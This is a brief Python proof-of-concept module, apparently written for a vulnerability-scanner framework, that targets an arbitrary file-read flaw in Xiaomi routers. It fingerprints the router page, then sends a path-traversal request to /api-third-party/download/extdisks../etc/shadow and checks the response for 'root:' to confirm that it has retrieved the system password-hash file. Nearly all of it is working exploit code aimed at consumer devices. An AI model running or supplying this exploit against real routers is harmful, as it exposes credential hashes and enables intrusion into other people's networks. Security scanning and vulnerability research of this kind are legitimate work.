from PocUtils import PocType, Severity
from PocUtils.Http import Http
from urllib.parse import urljoin


class Poc:
    def __init__(self):
        self.poc_type = PocType.http
        self.target = ""
        self.severity = Severity.high
        self.detail = """漏洞验证：/api-third-party/download/extdisks../etc/shadow"""
        self.name = "小米路由器任意文件读取漏洞"

    def check(self):
        client = Http()
        client.url = self.target
        resp = client.get()
        if "小米路由器" in resp.text:
            return True
        else:
            return False

    def exploit(self):
        client = Http()
        client.url = urljoin(self.target, "/api-third-party/download/extdisks")
        client.url += "../etc/shadow"
        resp = client.get()
        if "root:" in resp.text:
            return True
        else:
            return False
